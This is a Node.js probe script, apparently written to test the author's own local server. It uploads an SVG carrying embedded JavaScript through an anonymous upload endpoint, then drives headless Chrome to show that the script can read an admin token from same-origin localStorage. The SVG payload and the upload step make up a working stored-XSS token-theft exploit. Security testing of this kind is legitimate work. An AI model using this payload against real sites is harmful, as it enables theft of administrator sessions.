/**
 * 探针 M：用**真实 cloud-server**（8932）验证 SVG 同源 XSS。
 *
 * 与 run7 的区别：那边是自建 mock，这边是真的后台、真的上传接口、真的回读头。
 */
import { spawn } from 'node:child_process'
import { mkdtempSync } from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import http from 'node:http'

const CHROME = process.env.CHROME_EXE ??
  'C:/Users/Administrator/AppData/Local/ms-playwright/chromium-1243/chrome-win64/chrome.exe'
const BASE = process.env.BASE ?? 'http://127.0.0.1:8932'

const svg = `<svg xmlns="http://www.w3.org/2000/svg" width="320" height="90">
  <rect width="100%" height="100%" fill="#111"/>
  <text x="12" y="50" fill="#0f0" font-size="18">real server svg</text>
  <script><![CDATA[
    var t = '';
    try { t = localStorage.getItem('mc_admin_token') || '(empty)'; } catch (e) { t = 'err: ' + e.message; }
    document.title = 'PWNED:' + t;
  ]]><\/script>
</svg>`

function post(p, body, headers) {
  return new Promise((resolve, reject) => {
    const u = new URL(BASE + p)
    const r = http.request({ host: u.hostname, port: u.port, path: u.pathname + u.search, method: 'POST', headers }, (res) => {
      let b = ''
      res.on('data', (d) => { b += d })
      res.on('end', () => resolve({ status: res.statusCode, body: b }))
    })
    r.on('error', reject)
    r.write(body)
    r.end()
  })
}

const up = await post('/api/canvases/default/resources?name=real.svg', svg, { 'content-type': 'image/svg+xml' })
console.log('匿名上传:', up.status, up.body.slice(0, 160))
const url = BASE + JSON.parse(up.body).url

const userDataDir = mkdtempSync(path.join(os.tmpdir(), 'mc-probe-real-'))
const chrome = spawn(CHROME, [
  '--headless=new', '--remote-debugging-port=0', '--user-data-dir=' + userDataDir,
  '--no-first-run', '--no-default-browser-check', '--no-proxy-server', '--proxy-bypass-list=*',
  'about:blank',
], { stdio: ['ignore', 'pipe', 'pipe'] })

let stderr = ''
chrome.stderr.on('data', (d) => { stderr += String(d) })
const wsUrl = await new Promise((resolve, reject) => {
  const timer = setTimeout(() => reject(new Error('chrome 没启动：' + stderr.slice(-1200))), 20000)
  chrome.stderr.on('data', () => {
    const m = /DevTools listening on (ws:\/\/\S+)/.exec(stderr)
    if (m) { clearTimeout(timer); resolve(m[1]) }
  })
})
const dbgPort = new URL(wsUrl).port
const tgt = await (await fetch(`http://127.0.0.1:${dbgPort}/json/new?about:blank`, { method: 'PUT' })).json()
const ws = new WebSocket(tgt.webSocketDebuggerUrl)
await new Promise((r) => ws.addEventListener('open', r))

let id = 0
const pending = new Map()
ws.addEventListener('message', (ev) => {
  const msg = JSON.parse(String(ev.data))
  if (msg.id && pending.has(msg.id)) { pending.get(msg.id)(msg); pending.delete(msg.id) }
})
function send(method, params = {}) {
  const myId = ++id
  ws.send(JSON.stringify({ id: myId, method, params }))
  return new Promise((r) => pending.set(myId, r))
}

await send('Page.enable')
await send('Runtime.enable')

// 先在同源页面种一个令牌，再打开上传的 SVG
await send('Page.navigate', { url: BASE + '/' })
await new Promise((r) => setTimeout(r, 2500))
await send('Runtime.evaluate', { expression: "localStorage.setItem('mc_admin_token','REAL-FAKE-TOKEN-1234')" })

await send('Page.navigate', { url })
await new Promise((r) => setTimeout(r, 1500))

const title = await send('Runtime.evaluate', { expression: 'document.title', returnByValue: true })
const info = await send('Runtime.evaluate', {
  expression: "JSON.stringify({ origin: location.origin, token: localStorage.getItem('mc_admin_token'), referrer: document.referrer })",
  returnByValue: true,
})
console.log('打开 SVG 后 document.title =', title.result?.result?.value)
console.log('同源上下文读到 =', info.result?.result?.value)
console.log('SVG 地址 =', url)

ws.close(); chrome.kill()
process.exit(0)
